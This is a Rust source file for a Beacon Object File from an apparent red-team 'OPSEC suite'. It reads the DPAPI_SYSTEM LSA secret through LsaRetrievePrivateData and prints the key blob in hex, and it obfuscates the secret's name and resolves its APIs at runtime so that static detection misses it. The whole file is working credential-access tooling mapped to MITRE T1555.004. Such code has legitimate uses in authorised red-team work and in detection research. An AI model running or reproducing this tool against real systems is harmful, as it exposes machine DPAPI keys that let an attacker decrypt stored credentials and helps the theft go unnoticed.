// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
//
#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1555.004", name: "Windows Credential Manager", tactic: "Credential Access" },
];

const STATUS_SUCCESS: i32 = 0;

// LsaRetrievePrivateData — DFR via advapi32
dfr_fn!(
    lsa_open_policy(
        system_name: *const u8,
        object_attrs: *const u8,
        desired_access: u32,
        policy_handle: *mut usize,
    ) -> i32,
    module = "advapi32.dll",
    api    = "LsaOpenPolicy"
);

dfr_fn!(
    lsa_retrieve_private_data(
        policy_handle: usize,
        key_name: *const u8,
        private_data: *mut *mut u8,
    ) -> i32,
    module = "advapi32.dll",
    api    = "LsaRetrievePrivateData"
);

dfr_fn!(
    lsa_free_memory(buffer: *mut u8) -> i32,
    module = "advapi32.dll",
    api    = "LsaFreeMemory"
);

dfr_fn!(
    lsa_close(object_handle: usize) -> i32,
    module = "advapi32.dll",
    api    = "LsaClose"
);

// DPAPI system master key names stored as LSA secrets.
// We query "DPAPI_SYSTEM" — which holds machine+user DPAPI keys.
// The literal is obfuscated and decrypted on-stack at runtime, then converted
// to UTF-16 in a stack buffer. No plaintext "DPAPI_SYSTEM" appears in `.rdata`.

const POLICY_GET_PRIVATE_INFORMATION: u32 = 0x00000004;

// LSA_UNICODE_STRING layout: Length(u16), MaxLength(u16), [pad 4], Buffer(*u16)
#[repr(C)]
struct LsaUnicodeString {
    length: u16,
    max_length: u16,
    _pad: u32,
    buffer: *const u16,
}

// LSA_OBJECT_ATTRIBUTES (all zeros is valid for local access)
#[repr(C)]
struct LsaObjectAttributes {
    length: u32,
    root_directory: usize,
    object_name: *const u8,
    attributes: u32,
    security_descriptor: *const u8,
    security_quality_of_service: *const u8,
}

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    let oa = LsaObjectAttributes {
        length: core::mem::size_of::<LsaObjectAttributes>() as u32,
        root_directory: 0,
        object_name: core::ptr::null(),
        attributes: 0,
        security_descriptor: core::ptr::null(),
        security_quality_of_service: core::ptr::null(),
    };

    let mut policy: usize = 0;
    let rc = unsafe {
        lsa_open_policy(
            core::ptr::null(),
            &oa as *const _ as *const u8,
            POLICY_GET_PRIVATE_INFORMATION,
            &mut policy,
        )
    }.map_err(|_| "resolve failed")?;

    if rc != STATUS_SUCCESS {
        return Err("lsa open failed");
    }

    // Build "DPAPI_SYSTEM" UTF-16 in a stack buffer from the obfuscated source.
    // No plaintext appears in `.rdata`.
    obf! { let secret_ascii = "DPAPI_SYSTEM"; }
    let mut secret_wide = [0u16; 16];
    let n_chars = common::str_util::ascii_to_wide_buf(secret_ascii.as_bytes(), &mut secret_wide);
    let len_bytes = (n_chars * 2) as u16;

    let key = LsaUnicodeString {
        length: len_bytes,
        max_length: len_bytes,
        _pad: 0,
        buffer: secret_wide.as_ptr(),
    };

    let mut private_data: *mut u8 = core::ptr::null_mut();
    let rc2 = unsafe {
        lsa_retrieve_private_data(
            policy,
            &key as *const _ as *const u8,
            &mut private_data,
        )
    }.map_err(|_| "resolve failed")?;

    if rc2 != STATUS_SUCCESS || private_data.is_null() {
        unsafe { let _ = lsa_close(policy); };
        return Err("lsa data failed");
    }

    // private_data points to an LSA_UNICODE_STRING containing the DPAPI key blob
    // Length @ 0 (u16), Buffer @ 8 (*u16)
    let blob_len = unsafe { core::ptr::read_unaligned(private_data as *const u16) } as usize / 2;
    let blob_ptr = unsafe { core::ptr::read_unaligned(private_data.add(8) as *const *const u16) };

    println!("{} key blob ({} bytes):", obf!("DPAPI_SYSTEM"), blob_len * 2);
    // Print as hex
    for i in 0..blob_len.min(64) {
        let wc = unsafe { core::ptr::read_volatile(blob_ptr.add(i)) };
        if i % 16 == 0 { println!(""); }
        rustbof::print!("{:04x} ", wc);
    }
    println!("");

    unsafe {
        let _ = lsa_free_memory(private_data);
        let _ = lsa_close(policy);
    };
    Ok(())
}
